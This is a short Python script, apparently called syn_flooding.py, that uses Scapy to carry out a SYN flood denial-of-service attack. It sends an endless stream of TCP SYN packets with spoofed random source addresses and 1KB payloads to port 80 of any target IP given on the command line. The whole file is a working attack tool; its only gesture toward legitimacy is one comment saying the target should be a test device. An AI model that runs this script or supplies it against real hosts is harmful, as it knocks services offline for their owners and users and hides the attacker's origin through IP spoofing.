from scapy.all import *
from argparse import ArgumentParser
import socket


def main():
    
    # Specify the command line Arguments
    parser = ArgumentParser()
    parser.add_argument('--target-ip', '-t', help='Target IP address')
    parser.epilog = "Usage: python syn_flooding.py -t <IP Address>"        
    args = parser.parse_args()
    

    try:
        socket.inet_aton(args.target_ip) # Checks if it's a legal IP.
        
        if args.target_ip is not None: # Checks if argument is not empty
            
            target_ip = args.target_ip # target IP address (should be a testing router/firewall)
            
            target_port = 80 # the target port u want to flood
            
            ip = IP(src=RandIP("172.0.0.1/24"), dst=target_ip) # forge IP packet with source IP Spoofing and target ip as the destination IP address
            
            tcp = TCP(sport=RandShort(), dport=target_port, flags="S") # random source port, use TCP SYN packet.
            
            raw = Raw(b"X"*1024) # add some flooding data (1KB in this case, don't increase it too much, # otherwise, it won't work.)
            
            p = ip / tcp / raw # stack up the layers
            
            send(p, count=1, verbose=0) # send 1 packet to test if target ip is valid
            
            print("The SYN Flood has commence, do CTRL+C to cancel / exit")
            
            send(p, count=10000, loop=1, verbose=0) # send the constructed packet in a loop until CTRL+C is detected
            
    except:    
        print('[-]Please, use --target-ip or -t to set a Target IP Address!')
        print('[!]Example: -t 10.20.30.40')
        print('[?] -h for help')
        exit()
    

main()
